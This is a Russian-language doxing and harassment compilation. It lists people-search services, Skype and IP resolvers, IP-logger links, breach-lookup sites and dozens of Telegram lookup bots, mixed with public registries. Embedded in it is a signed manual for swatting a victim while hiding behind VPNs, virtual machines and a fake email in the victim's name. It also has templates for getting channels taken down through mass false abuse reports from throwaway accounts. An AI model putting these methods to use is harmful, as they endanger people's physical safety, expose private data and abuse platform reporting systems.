http://www.facebook.com/

https://deviantart.com

http://xanga.com/

http://tumblr.com/

http://myspace.com/

http://www.photobucket.com/

http://www.quora.com/

http://www.stumbleupon.com/

http://www.reddit.com

http://www.digg.com

http://www.plixi.com

http://pulse.yahoo.com/

http://www.flickr.com/

💙Номера телефонов

http://www.freecellphonedirectorylookup.com

http://www.numberway.com/

http://www.fonefinder.net

http://www.whitepages.com/reverse-lookup

http://www.anywho.com/reverse-lookup

http://www.yellowpages.com/reversephonelookup

http://www.spydialer.com/

http://www.intelius.com/reverse-phone-lookup.html

truecallerapp.com

❤IP-адреса

http://www.infosniper.net/

http://ip-lookup.net/

https://www.whatismyip.com/ip-whois-lookup/

http://whatstheirip.com

http://getthierip.com

💙Skype Resolvers

http://skypegrab.net/resolver.php

http://www.skresolver.com/index.php

http://resolvethem.com/

https://www.hanzresolver.com/skype2

https://skype-resolver.org/

http://mostwantedhf.info/

http://orcahub.com/skyperesolver.php

https://booter.xyz/skype-resolver/

http://cstress.net/skype-resolver/

http://iskyperesolve.com/

https://ddosclub.com/skype-resolver/index.php

❤Поиск по базе данных

http://skidbase.io/

haveibeenpwned.com

Leakedsource.com

💙WHOIS / Веб-сайт

https://www.whois.net/

http://whois.icann.org/en

https://who.is/

http://www.whois.com/whois

http://www.whois.com/

http://www.statsinfinity.com/

❤Изображения

http://www.tineye.com/

http://saucenao.com/

http://www.photobucket.com/

https://images.google.com/?gws_rd=ssl

💙IP2Skype

http://skypegrab.net/ip2skype.php

https://resolvethem.com/ip2skype.php

http://www.skresolver.com/ip-to-skype.php

http://mostwantedhf.info/ip2skype.php

https://www.hanzresolver.com/ip2skype

http://skype2ip.ninja/ip2skype.php

https://pkresolver.nl/ip2skype.php

http://www.chromeresolver.info/IP2Skype.php

❤ Email2Skype

http://mostwantedhf.info/email.php

http://www.skresolver.com/email-to-skype.php

https://www.hanzresolver.com/emaillookup

https://resolvethem.com/email.php

http://freetool.tk/email2skype.php

http://skypegrab.net/email2skype.php

💙Skype2Lan

http://www.skresolver.com/skype-to-lan.php

❤Skype2Email

http://skypegrab.net/skype2email.php

https://pkresolver.nl/skype2email.php

💙Поиск адреса MAC

http://www.coffer.com/mac_find/

http://www.whatsmyip.org/mac-address-lookup/

http://www.macvendorlookup.com/

http://macaddresslookup.org/

http://aruljohn.com/mac.pl

💙Lat / Long

http://www.latlong.net/

http://itouchmap.com/latlong.html

http://stevemorse.org/jcal/latlon.php

❤EXIF данные

http://exif-viewer.com/

http://metapicz.com/#landing

http://www.verexif.com/en/

http://www.findexif.com/

http://www.prodraw.net/online-tool/exif-viewer.php

http://exifdata.com/

💙 Регистраторы IP и скреппер

https://grabify.com

https://iplogger.com

http://blasze.com/

# не # пиять # содержание # Кали

❤Другое

http://www.abika.com/

http://www.freeality.com/

http://radaris.com/

http://twoogel.com/

http://www.advancedbackgroundchecks.com

http://www.spokeo.com/

http://www.peekyou.com/

http://yoname.com/

https://www.linkedin.com/

http://www.yellowpagesgoesgreen.org/

http://aad.archives.gov/aad/series-list.

еще фулл обучение тут https://mega.nz/update.html

это способ свата от меня @doxpermist

для начала скачиваем впн главное платный чтобы логи не сливал потом виртуалку также покупаем на пк virtualbox 

дальше впн и виртуалку 4 раза так делаем


потом создаём почту на жертву на его фи 

также создаем с почты сот сеть или также ютуб канал главное чтобы было его там фи можно и отчество 

потом сватаем по тексту ставим его фи 

и теперь ждите ;)

СТРОГО СОЗДАЛ МАНУАЛ ПЕРМИСТ [ЗА СЛИВ ПИЗДА ТЕБЕ]

Для начала нужно найти пост с раскрытием анонимности (докс , деанон ). Далее нам нужно составить адекватный текст. Например мы называем себя в сообщении именем которое в деаноне . "Здравствуйте , администрация. Я (ФИО) хочу пожаловаться на канал ( ссылка ) здесь недавно слили мои данные, вы можете увидеть это в этом посте ( ссылка на пост ) . Так же выставили меня в негативном ключе якобы "нацистом", но это не так. Прошу заблокировать этот телеграм канал и по возможности ограничить администраторам доступ к соцсети, заранее, спасибо.
Далее нам надо закинуть получившийся текст в переводчик на английский , и отправить на почту abuse@telegram.org .

Способ удаления групп по деанонимизиции.  
Здраствуйте, тех поддержка Телеграмм.Сегодня, я бы хотел пожаловаться на одну группу про "деанонимизации", в этой группе расспростроняют личную информацию людей, а вот это уже закон.Также присутсвуют маты.Прощу вас удалить эту группу, так как это в правилах запрещено.

@VolunteerSupportRobot


Спрособ удаления групп по "ИНТИМУ"  
Здраствуйте, Тех поддержка ВКонтакте.  
Сегодня, я бы хотел пожаловаться на одну группу про "сливание интимных фоток", а вот это запрещено в правилах.  
Здесь сливают Интим фотки чужих людей.  
Как док-ва, я вам оставлю скрины и ссылку на запись. Вы скринит все послы связанные с "ИНТИМОМ", так же оставляете ссылку на записи.  
1)Имя Фамилия  
2)Его вк  
3) старый вк  
4) школа  
5)номер школы  
6) адрес школы  
UPD: ТУТ ПРИЧИНУ  
Пару фоток, пару одноклассников



накручиваешь подписчиков на канал который хочешь снести, и потом пишешь в поддержку что типо есть накрутка

Domain Name: VK.ME
Registry Domain ID: D108500000000768536-AGRS
Registrar WHOIS Server:
Registrar URL: http://nic.ru
Updated Date: 2022-06-30T12:23:14Z
Creation Date: 2009-07-24T13:20:54Z
Registry Expiry Date: 2023-07-24T13:20:54Z
Registrar Registration Expiration Date:
Registrar: Regional Network Information Center, JSC dba RU-CENTER
Registrar IANA ID: 463
Registrar Abuse Contact Email:
Registrar Abuse Contact Phone:
Reseller:
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registrant Organization: Privacy protection service - whoisproxy.ru
Registrant State/Province: Moscow
Registrant Country: RU
Name Server: NS1.VKONTAKTE.RU
Name Server: NS2.VKONTAKTE.RU
Name Server: NS3.VKONTAKTE.RU
Name Server: NS4.VKONTAKTE.RU
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of WHOIS database: 2022-11-15T11:17:59Z <<<

For more information on Whois status codes, please visit https://icann.org/epp

Access to WHOIS information is provided to assist persons in determining the contents of a domain name registration record in
the registry database. The data in this record is provided by The Registry Operator for informational purposes only, and
accuracy is not guaranteed. This service is intended only for query-based access. You agree that you will use this data only
for lawful purposes and that, under no circumstances will you use this data to (a) allow, enable, or otherwise support the
transmission by e-mail, telephone, or facsimile of mass unsolicited, commercial advertising or solicitations to entities
other than the data recipient's own existing customers; or (b) enable high volume, automated, electronic processes that send
queries or data to the systems of Registry Operator, a Registrar, or Afilias except as reasonably necessary to register
domain names or modify existing registrations. All rights reserved. Registry Operator reserves the right to modify these
terms at any time. By submitting this query, you agree to abide by this policy.
The Registrar of Record identified in this output may have an RDDS service that can be queried for additional information on
how to contact the Registrant, Admin, or Tech contact of the queried domain name.

для сноса чужого телеграм канала, вам стоит ознакомиться со списком причин блокировки чужого канала Телеграмм.


•пропаганда насилия
из той-же серии – призывы к терроризму
•незаконное распространение музыкальных произведений (песен, саундтреков и альбомов)
•порнография
из той-же категории контент эротического содержания
•неоднократный спам (более 3-ех раз)
•постоянное использование ботов в чате
телеграмм использование ботов
•постоянная навязчивая самореклама в чате
•использование на канале исполняемых файлов (АРК или EXE)
из той-же категории – не делайте ссылки на исполняемые файлы. две последние категории нежелательны из-за возможности быть замаскированным вирусом.
•нарушение авторских прав. здесь чаще всего «попадают под раздачу» каналы с загруженными фильмами. ссылка на ролик ЮТУБ здесь вам в помощь.
модераторы телеграмм очень подозрительно относятся к каналам или чатам, где используется общение не на языке канала. то есть, если канал русскоязычный, а вы там общаетесь на условно китайском языке, то это уже повод поставить канал в серый список. модераторам и администраторам телеграмм такие каналы очень трудно, а иногда и невозможно модерировать.
•ну и напоследок, не приветствуется массовое использование стикеров и гифок. Здесь тоже все просто, cтикеры или картинки с жестами понимаются в разных культурах по-разному. и если где-нибудь в России этот стикер будет означать приветствие, то где-нибудь в республике зимбабве этот же стикер будет означать угрозу насилия.
отдельной темой и поводом для блокировки стоит реклама услуг финансового характера.

•любой аккаунт может быть заблокирован. Если использует принципы финансовых пирамид, так называемые схемы Левина понци. то есть, клиентов заманивают высокими процентами или дивидендами, но полученные деньги не вкладываются, а с них выплачиваются проценты старым клиентам.
•различные партнерские программы не приветствуются модераторами телеграмм. то есть те аккаунты. в которых основная цель: получение процентов от каждого нового клиента компании, на которую стоит ссылка с аккаунта, могут попасть в вечный банн.
•реферальные схемы, где есть посылы или обещания бесплатных денег или валюты.
•ставки или схемы инвестиций любого рода
•про «обнажёнку» и порнография я уже говорил
•оскорбления и унижения группы людей. группы людей могут быть разными, объединены по расовому признаку, религии, полу, возрасту, национальности и пр.
•жестко модерируются аккаунты в которых выявлены факты притеснения
канал блокируется, если в нем есть факты разглашения чужих личных данных. Это могут быть: ФИО, фото, адреса проживания и номера телефонов.


дальше схема действий проста. пишем модераторам на эту почту abuse@telegram.org.

излагаем конкретно факты нарушений правил телеграмм чужого канала. по опыту. одной жалобы будет совершенно недостаточно для блокировки аккаунта. создаём много левых почт, и пишем жалобы с них разделяя их по времени. если таких жалоб будет несколько (число зависит от аккаунта). то в течении нескольких недель аккаунт может быть заблокирован.

полной гарантии блокировки конечно нет. Но то что канал уже попадёт под наблюдение –это точно. и при последующих нарушениях с таким каналом точно не будут церемонится. в одиночку заблокировать канал телеграмм достаточно трудно, но возможно.

https://rosreestr.ru/wps/portal/p/cc_present/EGRN_1 - Форма запроса сведений ЕГРН
https://rosreestr.ru/wps/portal/p/cc_ib_portal_services/cc_ib_sro_reestrs - Реестры саморегулируемых организаций
https://rosreestr.ru/wps/portal/cc_ib_opendata - Наборы открытых данных Росреестра
https://pkk5.rosreestr.ru/ - Публичная кадастровая карта                                                                                                                                                            


Поиск по USERNAME/NICKNAME:
- https://namechk.com/

Поиск по EMAIL:
- https://haveibeenpwned.com/
- https://hacked-emails.com/
- https://ghostproject.fr/
- https://weleakinfo.com/
- https://pipl.com/
- https://leakedsource.ru/

Поиск по номеру телефона:
- https://phonenumber.to
- https://pipl.com/
  @get_kontakt_bot

Общий поиск по соц. сетям, большой набор разных инструментов для поиска:
- http://osintframework.com/
https://findclone.ru/- Лучшая доступная технология распознавания лиц (документация)

Поиск местоположения базовой станции сотового оператора:
- http://unwiredlabs.com
- http://xinit.ru/bs/

Получение фотографий из соц. сетей из локального района (по геометкам):
- http://sanstv.ru/photomap

https://www.reestr-zalogov.ru/search/index - Реестр уведомлений о залоге движимого имущества
https://мвд.рф/wanted - Внимание, розыск!
https://www.mos.ru/karta-moskvicha/services-proverka-grazhdanina-v-reestre-studentov/ - Проверка гражданина в реестре студентов/ординаторов/аспирантов (держатели карты москвича)
http://esugi.rosim.ru - Реестр федерального имущества Российской Федерации
pd.rkn.gov.ru/operators-registry - Реестр операторов, осуществляющих обработку персональных данных
bankrot.fedresurs.ru - Единый федеральный реестр сведений о банкротстве                                                                                               


Поиск контрагента

https://service.nalog.ru/zd.do - Сведения о юридических лицах, имеющих задолженность по уплате налогов и/или не представляющих налоговую отчетность более года
https://service.nalog.ru/addrfind.do - Адреса, указанные при государственной регистрации в качестве места нахождения несколькими юридическими лицами
https://service.nalog.ru/uwsfind.do - Сведения о юридических лицах и индивидуальных предпринимателях, в отношении которых представлены документы для государственной регистрации
https://service.nalog.ru/disqualified.do - Поиск сведений в реестре дисквалифицированных лиц
https://service.nalog.ru/disfind.do - Юридические лица, в состав исполнительных органов которых входят дисквалифицированные лица
https://service.nalog.ru/svl.do - Сведения о лицах, в отношении которых факт невозможности участия (осуществления руководства) в организации установлен (подтвержден) в судебном порядке
https://service.nalog.ru/mru.do - Сведения о физических лицах, являющихся руководителями или учредителями (участниками) нескольких юридических лиц

https://fedresurs.ru/ - Единый федеральный реестр юридически значимых сведений о фактах деятельности юридических лиц, индивидуальных предпринимателей и иных субъектов экономической деятельности 

http://rkn.gov.ru/mass-communications/reestr/ – реестры Госкомнадзора.
http://www.chinacheckup.com/ – лучший платный ресурс по оперативной и достоверной верификации китайских компаний.
http://www.dnb.com/products.html - модернизированный ресурс одной из лучших в мире компаний в сфере бизнес-информации Dun and Bradstreet.
http://www.imena.ua/blog/ukraine-database/ – 140+ общедоступных электронных баз данных Украины.
http://www.fciit.ru/ – eдиная информационная система нотариата России.
http://gradoteka.ru/ – удобный сервис статистической информации по городам РФ.
http://www.egrul.ru/ - сервис по поиску сведений о компаниях и директорах из государственных реестров юридических лиц России и 150 стран мира



1. @phonenumberinformation_bot
2. @Quick_osintik_bot
3. @UniversalSearchRobot
4. @search_himera_bot
5. @Solaris_Search_Bot
6. @Zernerda_bot
7. @t_sys_bot
8. @OSINTInfoRobot
9. @LBSE_bot
10. @SovaAppBot
11. @poiskorcombot
12. @SEARCHUA_bot
13. @helper_inform_bot
14. @infobazaa_bot
15. @declassified_bot
16. @GHack_search_bot
17. @osint_databot
18. @Informator_BelBot
19. @HowToFindRU_Robot
20. @SEARCH2UA_bot
21. @UsersSearchBot
22. @BITCOlN_BOT
23. @ce_poshuk_bot
24. @BlackatSearchBot
25. @dataisbot
26. @n3fm4xw2rwbot
27. @cybersecdata_bot
28. @safe_search_bot
29. @getcontact_real_bot
30. @PhoneLeaks_bot
31. @useridinfobot 
32. @mailcat_s_bot
33. @last4mailbot
34. @holehe_s_bot
35. @bmi_np_bot
36. @clerkinfobot
37. @kolibri_osint_bot
38. @getcontact_premium_bot
39. @phone_avito_bot
40. @pyth1a_0racle_bot
41. @olx_phone_bot
42. @ap_pars_bot
43. @SPOwnerBot
44. @regdatebot
45. @ibhldr_bot
46. @TgAnalyst_bot
47. @cryptoscanning_bot
48. @LinkCreatorBot
49. @telesint_bot
50. @Checknumb_bot

https://rulait.github.io/vk-friends-saver/ 
http://archive.is/ 
http://peeep.us/
https://archive.org/
http://www.cachedpages.com/ 
http://skyperesolver.net/ 
https://yip.su
https://vedbex.com/tools/iplogger 
http://phoneradar.ru/phone/ 
http://afto.lol/ 
http://zaprosbaza.pw/ 
https://radaris.ru/
https://service.nalog.ru/inn.html 
http://services.fms.gov.ru/info-service.htm?sid=2000 
https://2ch.hk/b/ 
http://sonetel.com/
http://psi-im.org/ 
https://discordapp.com/ 
http://viber.com/
http://www.vpnbook.com/
https://www.vpnkeys.com/ 
https://www.tcpvpn.com/ 
https://prostovpn.org/ 
https://lightvpn.pro/
http://spys.ru/
https://insorg.org
http://sockshub.net/ 
http://www.cekpr.com/decode-short-url/ 
https://temp-mail.org/
https://perfectmoney.is/
https://blockchain.info/
https://blackbiz.ws/ 
https://darkwebs.cc/
https://zblock.co/ 
https://newage-bank.com/
http://upbitcoin.com/
http://tomygame.com/
https://freebitco.in/
http://gr8.cc/

Для номера телефона Казахстана

1. truecaller.com (r) — телефонная книга, найдет имя и оператора телефона

2. fa-fa.kz — найдет ФИО, проверка наличия задолженностей, ИП, и ограничения на выезд

3. spravochnik109.link — поиск по городскому номеру телефона, найдет ФИО и адрес

4. @get_kolesa_bot (r) — найдет объявления на колеса.кз

5. m.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито

6. smartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей

7. @OffThisContactBot — поиск в утечках, ищет как записан номер в контактах, большая база контактов, бесплатно подключите свой бот

8. @Getcontact_Officialbot (r) — найдет как записан контакт, получает данные из приложения GetContact

9. /phone — список ресурсов для поиска по номеру телефона любой страны

————————————————————

Поиск по номеру телефона Украины

1. @OTcIa6RB_InfoB_Bot — клон ИнфоБазы, бесплатно найдет полное имя или его часть

2. @OffThisContactBot — поиск в утечках, ищет как записан номер в контактах, большая база контактов, для поиска подключи свой тг-бот

3. spravochnik109.link — поиск по городскому номеру телефона, найдет ФИО и адрес

4. @people_base_bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки

5. searchyellowdirectory.com — определит к какой области Украины принадлежит номер телефона

6. m.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито

7. smartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей

8. rol-x.ru — найдет объявления на OLX

9. @ce_poshuk_bot — даст ФИО, адрес, ИНН, другие номера телефонов

10. @olx_phone_bot (r) — найдет объявления на OLX, при регистрации можно отправить любой контакт боту

11. @poiskorcombot — найдет досье, данные паспорта, адрес, фото и автомобили

12. /phone — список ресурсов для поиска по номеру телефона любой страны

Список реестров и полезных сайтов Украины:

https://usr.minjust.gov.ua/ — Единый государственный реестр юридических лиц и физических лиц-предпринимателей;

http://rgf.informjust.ua/ — Реестр общественных формирований;

http://sfs.gov.ua/businesspartner — Налоговый долг;

https://erb.minjust.gov.ua/#/search-debtors — Аналог налогового долга;

http://reyestr.court.gov.ua/ — Судебный реестр;

https://court.gov.ua/ — Судебная власть (можно перейти на другие реестры, связанные с судебной системой);

https://igov.org.ua/service/1397/general — Собственники авто;

https://kap.minjust.gov.ua/login/index/ — Недвижимость;

https://map.land.gov.ua/kadastrova-karta — Кадастровая карта;

http://gisfile.com/map/ — Удобный аналог кадастровой карты;

http://posipaky.info/ — Реестр помощников народных депутатов;

https://posipaky-2.info/ — Реестр помощников депутатов областных и городских советов;

http://www.uipv.org/ua/bases2.html — Реестры Укрпатента;

https://smida.gov.ua/db/emitent/find — СМИДА (информация об акционерных обществах);

https://spending.gov.ua/ — Казначейские оплаты;

https://public.nazk.gov.ua/ — Декларации;

http://nomer-org.me/allukraina/ — Адреса, телефоны, сожители;

https://spravochnik109.link/ukraina — Аналог nomer.org;

http://data.gov.ua — Национальный портал открытых данных;

https://ring.org.ua/ — Поиск по государственным реестрам;

https://opendatabot.com/ — Сервис мониторинга регистрационных данных;

https://clarity-project.info/edrs — Реестр компаний;

https://youcontrol.com.ua/landing_002/ — Досье предприятий;

http://z.texty.org.ua/ — Участие в тендерах;

https://prozorro.gov.ua/ — Реестр закупок.

Еще парочка полезных международных реестров:

https://opencorporates.com/ — Данные о предприятиях;

https://aleph.occrp.org/ — открытая база данных международной организации OCCRP, которая специализируется на расследованиях в сфере коррупции.

————————————————————

Поиск по номеру телефона России

1. AVinfoBot (r) – делает отчет где есть данные из социальных сетей, недвижимости, автомобилей, объявлений и телефонных книжек. Нужно пригласить другой аккаунт для отчета

2. getcontact.com (r) — выдает информацию о том как записан номер в контактах

3. @OffThisContactBot — поиск в утечках, ищет как записан номер в контактах, большая база контактов, бесплатно подключите свой бот

4. truecaller.com (r) — телефонная книга, ищет имя и оператора телефона

5. spravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес

6. m.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито

7. smartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей

8. list-org.com — найдет организацию в РФ

9. odyssey-search.info (r) — сыщет ФИО, объявления Avito, автомобили, документы, места работы, контакты, а при регистрации можно указать любую российскую организацию

10. find-org.com — найдет компанию в РФ

11. SaveRuData — покажет, полный адрес, имя, все из сервиса Яндекс Еда, СДЕК, траты на еду за 6 месяцев, работает через VPN

12. x-ray.contact (r) — в утечек найдет имя, аккаунты, адреса, почту, вход из России запрещён, нужен VPN

13. bbro.su — найдет имя аккаунта на Авито и его объявления

14. @Getcontact_Officialbot (r) — найдет как записан контакт, получает данные из приложения GetContact

15. @Zernerda_bot — ищет в двухсот слитых базах, находит адреса, имена, аккаунты и много другого, бесплатный поиск после первого запуска бота

16. @declassified_bot — найдет почту, имена, адреса, авто

17. @detectiva_robot — выдаст аккаунт ВК, ОК, адреса, почту, утечки

18. @data_surf_bot (r) — ищет в утечках, выдает адреса имена, почты и прочее, одна бесплатная попытка на аккаунт

19. /phone — список ресурсов для поиска по номеру телефона любой страны

ИСТОЧНИКИ ДЛЯ ПРОВЕРКИ ГРАЖДАН РОССИИ

Международный розыск:

└ https://www.interpol.int/notice/search/wanted

Список теppористов:

└ http://fedsfm.ru/documents/terrorists-catalog-portal-act

Федеральный розыск:

└ https://mvd.ru/wanted

Розыск сбежавших заключенных:

└ http://fsin.su/criminal/

Розыск ФССП:

└ http://fssprus.ru/iss/ip_search

Действительность паспорта:

└ http://сервисы.гувм.мвд.рф/info-service.htm?sid=2000

Проверка ИНН:

└ https://service.nalog.ru/inn.do

Кредиты:

└ https://app.exbico.ru/

Исполнительные производства:

└ http://fssprus.ru/iss/ip

Налоговые задолженности:

└ https://peney.net/

Залоги имущества:

└ https://www.reestr-zalogov.ru/state/index#

Банкротство:

└ https://bankrot.fedresurs.ru/

Участие в судопроизводстве:

└ https://bsr.sudrf.ru/bigs/portal.html

Решения мировых судей СПб:

└ https://mirsud.spb.ru/

Участие в бизнесе:

└ https://zachestnyibiznes.ru/

└ https://ogrn.site/

Поиск в соцсетях:

└ https://yandex.ru/people

└ https://pipl.com

————————————————————

Поиск по номеру телефона любой страны

1. PhoneInfoga — определят тип номера, город, дает дорки Google

2. numberway.com — найдет телефонный справочник

3. UsersBox.org — бот, найдет аккаунты, пароли, почты, имена, бесплатный период 14 дней для новых аккаунтов

4. @GetFb_bot — находит аккаунт Facebook

5. smsc.ru — статус активности телефона

6. Ignorant (t) — находит к какому сайту привязан номер телефона

7. @clerkinfobot — находит объявления и как записан номер телефона в контактах, берет данные из приложения getcontact

8. tools.whoisxmlapi.com (r) — выявляет домены веб-сайтов зарегистрированые на номер телефона

9. vedbex.com — найдет аккаунт Skype

10. aihitdata.com (r) — найдет компании по всему миру где указан телефон, откройте вкладку “More Fields”

11. sync.me (r) — покажет имя из контактов и уровень спама

12. leak-lookup.com (r) — покажет на каких сайтах была утечка с искомым номером телефона

13. NumBuster (a, r) — Android приложение покажет как записан номер телефона в контактах

14. revealname.com — выдаст имя владельца телефона, название операра связи

15. Truecaller.com (r) — покажет как записан номер телефона в контактах

16. @LeakCheckBot — покажет на каком сайте утёк телефон, бот принимает телефон только в виде цифр, без знаков плюс и т.п.

17. @getcontact_real_bot — покажет как записан номер телефона в контактной книжке

18. whoseno.com — отобразит имя

19. leakedsource.ru — покажет в каких базах замечен телефон, даст домен и дату утечки

20. Intelx.io — найдёт упоминание номера телефона в утечках, даст имя файла и источника, вводите номер телефона во всех возможных форматах, с плюсом и без, с дефисом или скобками, и

без них

21. @QuickOSINT_Robot — найдет оператора, email, адрес, как записан в контактах и многое другое, всего 3 бесплатных запроса для новых аккаунтов

22. @PhoneLeaks_bot — поиск в утечках, даст название источника слива

23. @n3fm4xw2rwbot — найдет возможные имена, адрес, email, телефоны, ВК, пароли, авто

24. Fuck-Facebook — найдет аккаунт Facebook в глобальной утечке, нужно пройти капчу перед поиском

25. @GetOK2bot — найдет профиль в Одноклассниках и даст ссылку на него

26. @OffThisContactBot — поиск в утечках, ищет как записан номер в контактах, аккаунты, адреса и прочее, для поиска подключите свой тг-бот, вводите телефон по разному, со скобками или

без них и т.д

27. seon.io (r) — найдет аккаунты Skype, Viber, WhatsApp, Microsoft, проверит где зарегистрирован

28. emobiletracker.com — выдаст имя владельца телефона

29. @safe_search_bot — в утечках находит адреса, телефоны почты

30. x-ray.contact (r) — находит имена, логины, аккаунты, почты, фотографии, адреса и прочее, вход по IP адресу России запрещён, используй VPN

31. @t_sys_test_bot — найдет прописку, штрафы, авто, почты, дату рождения. документы, авиабилеты и прочее, бесплатный поиск 24 часа после первого запуска бота, вводите телефон только

цифрами

32. ⚡️@UniversalSearchRobot — находит город, первую букву улицы, номера дома или квартиры, аккаунты и прочее

Инструменты

1. globfone.com — бесплатные анонимные звонки на любой номер телефона

Дополнительный методы

1. Оставьте только цифры у номера телефона и добавьте к нему @yandex.ru. Получится адрес почты для которого есть поисковые ресурсы - /email

————————————————————

Поиск по ФИО гражданина любой страны

1. aleph.occrp.org — поиск по базам данных, файлам, реестрам компаний, утечкам, и другим источникам

2. locatefamily.com — найдет адрес

3. infobel.com — найдет номер телефона, адрес и ФИО

4. rocketreach.co (r) — поиск людей в LinkedIn, Facebook и на других сайтах, находит email

5. munscanner.com — поиск по реестрам компаний разных стран

6. news-explorer.mybluemix.net — поиск в СМИ, найдет ассоциации между компаниями, публикациями и личностями

7. sanctionssearch.ofac.treas.gov — поиск в санкционном списке США

8. emailGuesser (t) — подбирает на основе ФИ все возможные комбинации email адреса и верифицирует их

9. billiongraves.ru — найдет когда умер и где захоронен

10. findmypast.co.uk (r) — браки, смерти, рождения до 2006 года, нужно указать страну, нет стран СНГ

11. webmii.com — упоминания в новостях, профили в социальных сетях, видео, можно добавить ключевое слово для точного результата

12. aihitdata.com (r) — найдет компании по всему миру где работает человек, откройте вкладку “More Fields” и введите ФИ в кавычках

13. xlek.com — найдет какой домен был зарегистрирован на искомое ФИО, поиск в whois, покажет контакты и адреса

14, my.mail.ru (r) — даст аккаунт но Мой Мир, есть фильтры по возрасту, росту, весу, интересам и прочему

15. leak-lookup.com (r) — покажет на каких сайтах была утечка с искомым ФИО

16. offshoreleaks.icij.org — найдет офшорные компании, адреса и их связи между собой, поиск по имени и фамилии на латинском

17. app02.bazl.admin.ch — реестр Швейцарии, найдет зарегистрированные самолёты и вертолеты, используй расширенный поиск, имя только латиницей

18. UsersBox.org — бот, найдет аккаунты, пароли, почты, имена, бесплатный период 14 дней для новых аккаунтов

19. leakedsource.ru — покажет в каких базах замечено имя, даст домен и дату утечки

20. opensanctions.org — найдет в списке санкций, даст дату рождения, должность, другое имя, членство в организациях, попробуй ввести имя латиницей

21. seintpl.github.io — даст прямые ссылки на социальные сети и поисковики с разными вариантами имени, вводить ФИО только на латинице

22. @OffThisContactBot — найдет номер телефона, ищет в именах глобальной телефонной книги, бесплатно подключите свой бот

23. archivesportaleurope.net — найдет упоминание в национальных архивах стран Европы, можно найти в списках работодателей, учебных учреждений, военных архивах и в многих других

архивах

24. Fuck-Facebook — найдет номер телефона, ID аккаунта Facebook, работу, в глобальной утечке Facebook, нужно пройти капчу перед поиском

25. @t_sys_test_bot — найдет прописку, штрафы, авто, почты, дату рождения. документы, авиабилеты и прочее, бесплатный поиск 24 часа после первого запуска бота, можно указать только

часть даты рождения

————————————————————

Инструменты

1. behindthename.com — найдет виды произношения имени, пол, выражение в других языках, значение и историю, связанные имена, страну где чаще используется

Восстановление доступа

1. Samsung — покажет часть email или телефона, необходимо ввести полную дату рождения и быть залогининым на сайте Samsung

————————————————————

Поиск по Email адресу любых почтовых сервисов

1. haveibeenpwned.com — проверка почты в слитых базах

2. emailrep.io — найдет на каких сайтах был зарегистрирован аккаунт использующий определенную почту

3. dehashed.com (r) — проверка почты в слитых базах

4. intelx.io — находит упоминание почты в архиве утечек, Tor, I2P и в крупных базах

5. @OTcIa6RB_InfoB_Bot — клон ИнфоБазы, бесплатно найдет часть ФИО и телефона гражданина Украины

6. leakedsource.ru — покажет в каких базах слита почта

7. mostwantedhf.info — найдет аккаунт skype

8. email2phonenumber (t) — автоматически собирает данные со страниц восстановления аккаунта, и находит номер телефона

9. spiderfoot.net (r) — автоматический поиск с использованием огромного количества методов, можно использовать в облаке если пройти регистрацию

10. @last4mailbot — бот найдет последние 4 цифры номера телефона клиента Сбербанка

11. AVinfoBot (r) — найдет аккаунт в ВК

12. identificator.space (r) — найдет аккаунт Skype, Duolingo, Google, где регистрирован, авторизация без подтверждения

13. ГлазБога.com (r) — найдет фото из аккаунтов пользователя

14. cyberbackgroundchecks.com — найдет все данные гражданина США, вход на сайт разрешен только с IP адреса США

15. holehe (t) — инструмент проверяет аккаунты каких сайтов зарегистрированы на искомый email адрес, поиск по 30 источникам

16. tools.epieos.com — найдет Google ID, даст ссылки на профиль в Google карты, альбомы и календарь, найдет к каким сайтам привязана почта, профиль LinkedIn

17. ⚡️@UniversalSearchRobot — найдет профили на Яндекс, в сервисах Google, утекшие пароли, социальные сети, адрес регистрации, номер телефона, био, Gmail адрес и прочее

18. rocketreach.co (r) — выдает имя, профили в социальных сетях, почты, часть телефона, и прочее

19. m.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито

20. avatarapi.com — найдет аватарку из множества источников

21. @SovaAppBot — найдет к каким сайтам привязана почта, результаты могут отличаться от аналогичных инструментов

22. vedbex.com — найдет аккаунт Skype

23. odyssey-search.info (r) — персональные данные гражданина России, Украины, автомобили, документы, аккаунты с социальных сетях, зарегистрироваться можно на имя любой

существующий компании

24. tools.whoisxmlapi.com (r) — найдет домены сайтов, поиск в истории whois

25. @LeakCheckBot — покажет на каких сайтах утекли пароли

26. @a11_1n_bot (r) — выдаст ссылку на профиль Facebook

27. aihitdata.com (r) — ищет почту в контактах компаний по всему миру, откройте на сайте вкладку “More Fields”

————————————————————

90+ Ботов для пробивов

1.@phonenumberinformation_bot

2. @Quick_osintik_bot

3. @UniversalSearchRobot

4. @search_himera_bot

5. @Solaris_Search_Bot

6. @Zernerda_bot

7. @t_sys_bot

8. @OSINTInfoRobot

9. @LBSE_bot

10. @SovaAppBot

11. @poiskorcombot

12. @SEARCHUA_bot

13. @helper_inform_bot

14. @infobazaa_bot

15. @declassified_bot

16. @GHack_search_bot

17. @osint_databot

18. @Informator_BelBot

19. @HowToFindRU_Robot

20. @SEARCH2UA_bot

21. @UsersSearchBot

22. @BITCOlN_BOT
23. @ce_poshuk_bot

24. @BlackatSearchBot

25. @dataisbot

26. @n3fm4xw2rwbot

27. @cybersecdata_bot

28. @safe_search_bot

29. @getcontact_real_bot

30. @PhoneLeaks_bot

31. @useridinfobot

32. @mailcat_s_bot

33. @last4mailbot

34. @holehe_s_bot

35. @bmi_np_bot

36. @clerkinfobot

37. @kolibri_osint_bot

38. @getcontact_premium_bot

39. @phone_avito_bot

40. @pyth1a_0racle_bot

41. @olx_phone_bot

42. @ap_pars_bot

43. @SPOwnerBot

44. @regdatebot

45. @ibhldr_bot

46. @TgAnalyst_bot

